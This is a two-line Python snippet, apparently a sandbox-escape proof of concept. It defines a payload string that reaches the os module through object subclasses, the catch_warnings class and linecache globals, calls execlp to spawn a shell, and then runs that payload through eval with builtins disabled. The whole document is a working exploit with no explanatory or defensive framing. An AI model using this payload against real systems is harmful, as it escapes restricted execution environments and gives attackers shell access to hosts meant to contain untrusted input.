payload = '[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == "catch_warnings"][0].__init__.func_globals["linecache"].__dict__["os"].execlp("sh","sh")'

eval(payload, {'__builtins__': None}, {})
